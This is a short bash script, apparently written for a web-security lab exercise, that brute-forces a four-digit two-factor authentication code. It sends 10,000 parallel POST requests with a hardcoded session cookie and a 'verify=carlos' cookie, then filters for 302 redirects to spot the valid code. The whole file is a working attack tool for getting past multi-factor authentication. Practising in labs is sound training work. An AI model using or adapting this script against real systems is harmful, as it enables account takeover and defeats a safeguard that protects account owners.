#!/bin/bash

# Function to parallize curl requests to brute force 2fa
# Only works on 4 digits - don't wanna bother with more than that.
if [ -z ${1+x} ]; then
    echo "Expecting first argument to be the host endpoint"
    exit 255
else
    host=$1
fi

# Customize the `-w format output and egrep below`
# Ref: https://everything.curl.dev/usingcurl/verbose/writeout
printf '%04i\n' {0..9999} | xargs -n5 -P100 -I@ \
    curl -s -X 'POST' \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        --cookie 'verify=carlos; session=a0Sw1rrElWtaUeQ5LL0uTircCEbWk9Vc' \
        --data 'mfa-code=@' \
        --url "$host" \
        --retry 10 \
        -w "%{response_code}: @\n" -o /dev/null  | grep -E "^302:"
